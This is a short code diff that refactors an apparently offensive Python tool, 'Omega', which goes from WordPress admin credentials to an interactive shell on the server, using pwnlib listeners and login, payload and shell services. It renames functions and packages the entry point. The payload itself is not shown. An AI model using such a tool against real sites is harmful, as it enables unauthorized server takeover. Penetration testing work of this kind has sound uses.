@@ -4,7 +4,7 @@ import os, threading
 from argparse import Namespace
 from pwnlib.log import install_default_handler, getLogger
 from pwnlib.tubes.listen import listen
-from services import (
+from omega_wp.services import (
     LoginService,
     PayloadService,
     ShellService,
@@ -29,7 +29,7 @@ def shell_handler(shell: listen):
     os._exit(0)
 
 
-def main(args: Namespace):
+def omega(args: Namespace):
     wp_url = args.wp_url.strip('/')
     username = args.username
     password = args.password
@@ -80,15 +80,18 @@ def main(args: Namespace):
         shell.sendline(b'') # Make the prompt appear
     shell.interactive()
 
-if __name__ == '__main__':
+def main():
     print('Omega - From Wordpress admin to pty\n')
 
     parameterParserService = ParametersParserService()
     args = parameterParserService.parse_params()
 
     try:
-        main(args)
+        omega(args)
     except KeyboardInterrupt:
         log.failure('Interrupted')
     except Exception:
         log.failure('Attack failed!')
+
+if __name__ == '__main__':
+    main()
